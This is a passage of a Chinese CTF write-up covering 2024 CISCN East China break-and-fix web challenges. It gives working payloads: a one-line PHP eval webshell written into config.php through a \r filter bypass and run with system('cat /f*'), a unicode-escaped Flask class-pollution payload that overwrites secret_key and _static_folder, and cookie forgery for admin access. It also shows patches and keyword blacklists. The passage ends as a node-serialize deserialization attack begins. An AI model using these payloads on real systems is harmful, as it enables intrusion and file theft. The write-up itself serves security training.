class="string">&quot;config.php&quot;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;config.php&quot;</span>).<span class="variable">$str</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO ACCESS&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;js/jquery-1.9.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;js/jquery.base64.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">submitData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        obj.name = $(<span class="string">&#x27;#newusername&#x27;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">        <span class="keyword">var</span> str = $.base64.<span class="title function_ invoke__">encode</span>(JSON.<span class="title function_ invoke__">stringify</span>(obj.name).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&quot;</span>).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&quot;</span>));</span><br><span class="line">        $.<span class="title function_ invoke__">post</span>(<span class="string">&quot;edit.php&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">newusername</span>: str</span><br><span class="line">            &#125;,</span><br><span class="line">            function(str)&#123;</span><br><span class="line">                <span class="title function_ invoke__">alert</span>(str);</span><br><span class="line">                location.<span class="title function_ invoke__">reload</span>()</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jQuery.base64 = (<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> keyStr = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">utf8Encode</span>(<span class="params"><span class="keyword">string</span></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//省略加密部分</span></span><br><span class="line">            <span class="keyword">return</span> utftext;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">		   <span class="comment">//省略加密部分</span></span><br><span class="line">            <span class="keyword">return</span> output;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            encode: <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">encode</span>(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;(jQuery));</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">更改用户名&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;newusername&quot;</span> id=<span class="string">&quot;newusername&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;button type=<span class="string">&quot;submit&quot;</span> onclick=<span class="string">&quot;submitData()&quot;</span> &gt;更改&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>注意到存在<code>file_put_contents()</code>函数，往前推发现变量str就是session中的username</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents(&quot;config.php&quot;,file_get_contents(&quot;config.php&quot;).$str);</span><br></pre></td></tr></table></figure>

<p><code>$str = &quot;//登陆时间$time,$username $p&quot;;</code>是由三部分拼接的，并且过滤了换行<code>\n</code></p>
<p>我们可以尝试写马，使用<code>\r</code>绕过换行（这里可以不用<code>&lt;&gt;</code>标签，直接eval）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\<span class="title function_ invoke__">reval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>base64编码一下就是payload</p>
<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706103833600.png"></p>
<p>注意这里<code>\r</code>不能直接用cyberchef按字符加密</p>
<p>我们可以将上述加密解码一下</p>
<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706104121502.png"></p>
<p>我们在edit.php输入我们要修改的payload，然后访问home.php成功写入一句话木马到数据库</p>
<p>最后就是在config.php与数据库进行交互操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db_host = &#x27;127.0.0.1&#x27;;</span><br><span class="line">$db_name = &#x27;ctf&#x27;;</span><br><span class="line">$db_user = &#x27;root&#x27;;</span><br><span class="line">$db_pwd = &#x27;root&#x27;;</span><br><span class="line">$dsn = &quot;mysql:host=$db_host;dbname=$db_name&quot;;</span><br><span class="line">$pdo = new PDO($dsn,$db_user,$db_pwd);</span><br></pre></td></tr></table></figure>

<p>访问<code>/config?1=system(&#39;cat /f*&#39;);</code>即可得到flag</p>
<h3 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h3><p>上述攻击手段是通过写入一句话木马到数据库</p>
<p>那么我们可以删掉写数据库操作即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello,&quot;</span>.<span class="string">&quot;<span class="subst">$username</span>&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO ACCESS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="Polluted"><a href="#Polluted" class="headerlink" title="Polluted"></a>Polluted</h2><h3 id="BREAK-2"><a href="#BREAK-2" class="headerlink" title="BREAK"></a>BREAK</h3><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, session, redirect, url_for,request,render_template</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def generate_random_md5():</span><br><span class="line">    random_string = os.urandom(16)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line"></span><br><span class="line">    return md5_hash.hexdigest()</span><br><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line">class evil():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">    session[&quot;username&quot;] = username</span><br><span class="line">    session[&quot;password&quot;] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    if request.data:</span><br><span class="line">        if filter(str(request.data)):</span><br><span class="line">            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br><span class="line">        else:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def templates():</span><br><span class="line">    username = session.get(&quot;username&quot;, None)</span><br><span class="line">    password = session.get(&quot;password&quot;, None)</span><br><span class="line">    if username and password:</span><br><span class="line">        if username == &quot;adminer&quot; and password == app.secret_key:</span><br><span class="line">            return render_template(&quot;important.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Unauthorized&quot;</span><br><span class="line">    else:</span><br><span class="line">        return f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,debug=True, port=80)</span><br></pre></td></tr></table></figure>

<p>存在merge函数那么考点肯定是python原型链污染</p>
<p>首先定义了<code>secret_key</code>，使用os.urandom函数生成随机数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def generate_random_md5():</span><br><span class="line">    random_string = os.urandom(16)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line">    </span><br><span class="line">app.secret_key = generate_random_md5()</span><br></pre></td></tr></table></figure>

<p>定义了黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br></pre></td></tr></table></figure>

<p>json格式数据可以用unicode编码，所以这里关键字都可以绕过</p>
<p>定义了evil类，初始化的作用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class evil():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>

<p><code>/</code>路由下POST传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">    session[&quot;username&quot;] = username</span><br><span class="line">    session[&quot;password&quot;] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    if request.data:</span><br><span class="line">        if filter(str(request.data)):</span><br><span class="line">            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br><span class="line">        else:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br></pre></td></tr></table></figure>

<p>接收username和password，并赋值给session。然后evil初始化，对传参的值黑名单检测（unicode绕过）</p>
<p>如果未检测到则执行merge函数，存在原型链污染漏洞</p>
<p><code>/admin</code>路由如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def templates():</span><br><span class="line">    username = session.get(&quot;username&quot;, None)</span><br><span class="line">    password = session.get(&quot;password&quot;, None)</span><br><span class="line">    if username and password:</span><br><span class="line">        if username == &quot;adminer&quot; and password == app.secret_key:</span><br><span class="line">            return render_template(&quot;important.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Unauthorized&quot;</span><br><span class="line">    else:</span><br><span class="line">        return f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br></pre></td></tr></table></figure>

<p>检测session中的username和password是否正确，正确则返回flag</p>
<p><strong>思路</strong></p>
<p>由于得到flag的条件非常苛刻，因为我们根本无法确定<code>secret_key</code>的值，所以我们选择污染key，然后利用<code>/</code>路由下的对session赋值，得到<code>adminer:123456</code>的cookie，再拿此cookie去访问<code>/admin</code>即可实现绕过</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">        &quot;app&quot;:&#123;</span><br><span class="line">            &quot;secret_key&quot;:&quot;123456&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;\u005f\u005fin\u0069t\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u005f\u005fglob\u0061ls\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u0061pp&quot;:&#123;</span><br><span class="line">            &quot;secret\u005fkey&quot;:&quot;123456&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>污染成功后，登录<code>adminer:123456</code>拿cookie，然后访问<code>/admin</code></p>
<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623115809810.png"></p>
<p>发现没有flag，想到还有个知识点 <code>_static_folder</code>  是用于指定静态文件的存放路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">        &quot;app&quot;:&#123;</span><br><span class="line">            &quot;secret_key&quot;:&quot;123456&quot;,</span><br><span class="line">            &quot;_static_folder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;\u005f\u005fin\u0069t\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u005f\u005fglob\u0061ls\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u0061pp&quot;:&#123;</span><br><span class="line">            &quot;secret\u005fkey&quot;:&quot;123456&quot;,</span><br><span class="line">            &quot;\u005fstatic\u005ffolder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>污染成功后我们直接访问静态路由<code>10.1.180.19/static/flag</code>，成功拿到flag</p>
<h3 id="FIX-2"><a href="#FIX-2" class="headerlink" title="FIX"></a>FIX</h3><p>直接添加对unicode的waf，以及读取静态路由的关键字<code>_static_folder</code></p>
<p>原来黑名单修改一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;globals&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;_static_folder&#x27;,&#x27;\u005f&#x27;, &#x27;\u0069&#x27;, &#x27;\u0061&#x27;, &#x27;\u004&#x27;,&#x27;\u0067&#x27;,&#x27;\u006c&#x27;,&#x27;\u006f&#x27;,&#x27;\u0062&#x27;,&#x27;\u0063&#x27;,&#x27;\u0064&#x27;,&#x27;\u006c&#x27;,&#x27;\u0073&#x27;, &#x27;\u0065&#x27;, &#x27;\u0066&#x27;, &#x27;\u0068&#x27;,&#x27;\u0074&#x27;,&#x27;\u006d&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure>

<p>不过一直修到最后一轮还是没成功，赛后才想到这里的<code>\</code>要转义，应该是<code>\\u0061</code>这样</p>
<p>其实也不用那么复杂</p>
<p>对unicode的过滤直接过滤<code>\</code>就行，关键字拆开过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;globals&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;static&#x27;, &#x27;folder&#x27;,&#x27;\&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure>

<p>比赛的时候只能说脑袋给烧晕了，最简单的修复都没想到</p>
<h2 id="bigfish"><a href="#bigfish" class="headerlink" title="bigfish"></a>bigfish</h2><h3 id="BREAK-3"><a href="#BREAK-3" class="headerlink" title="BREAK"></a>BREAK</h3><p>访问admin路由的时候发现出现了<code>set-cookie</code>，给了两个cookie：<code>is_admin=false</code>和<code>username</code></p>
<p>尝试修改为<code>Cookie: is_admin=true;username=admin</code>成功登录</p>
<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706105234987.png"></p>
<p>尝试路径穿越发现根本读取不到其他文件</p>
<p>审计一下fish.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> schedule = <span class="built_in">require</span>(<span class="string">&#x27;node-schedule&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change working directory to /srv</span></span><br><span class="line">process.<span class="title function_">chdir</span>(<span class="string">&#x27;/srv&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rule1 = <span class="keyword">new</span> schedule.<span class="title class_">RecurrenceRule</span>();</span><br><span class="line">rule1.<span class="property">minute</span> = [<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span> , <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">36</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">45</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">57</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定时清除</span></span><br><span class="line"><span class="keyword">let</span> job1 = schedule.<span class="title function_">scheduleJob</span>(rule1, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;data.html&#x27;</span>,<span class="string">&quot;#获取的数据信息\n&quot;</span>,<span class="keyword">function</span>(<span class="params">error</span>)&#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wriet error&quot;</span>)</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;express-art-template&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data_path = <span class="string">&quot;data.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Middleware to set default cookies for /admin route</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setDefaultAdminCookies</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>.<span class="property">username</span>) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;normal&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">cookies</span>.<span class="property">is_admin</span>) &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&#x27;is_admin&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主页</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">	fs.<span class="title function_">appendFile</span>(<span class="string">&#x27;data.html&#x27;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>)+<span class="string">&quot;\n&quot;</span>,<span class="keyword">function</span>(<span class="params">error</span>)&#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">	&#125;);</span><br><span class="line">	res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//后台管理</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span> || req.<span class="property">cookies</span>.<span class="property">is_admin</span> !== <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">is_admin</span> === <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">render</span>(<span class="string">&#x27;admin.html&#x27;</span>,&#123;</span><br><span class="line">            datadir : data_path</span><br><span class="line">        &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/admin&#x27;</span>, setDefaultAdminCookies, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span> || req.<span class="property">cookies</span>.<span class="property">is_admin</span> !== <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">is_admin</span> === <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">newname</span>)&#123;</span><br><span class="line">			data_path = req.<span class="property">body</span>.<span class="property">newname</span>;</span><br><span class="line">			res.<span class="title function_">redirect</span>(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			res.<span class="title function_">redirect</span>(<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//已弃用的登录</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/login.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">Buffer</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">var</span> obj = serialize.<span class="title function_">unserialize</span>(str);</span><br><span class="line">		<span class="keyword">if</span> (obj.<span class="property">username</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">escape</span>(obj.<span class="property">username</span>) === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">				res.<span class="title function_">send</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//QQ</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/qq&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span> || req.<span class="property">cookies</span>.<span class="property">is_admin</span> !== <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">is_admin</span> === <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, data_path));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>我们注意到<code>/login</code>路由</p>
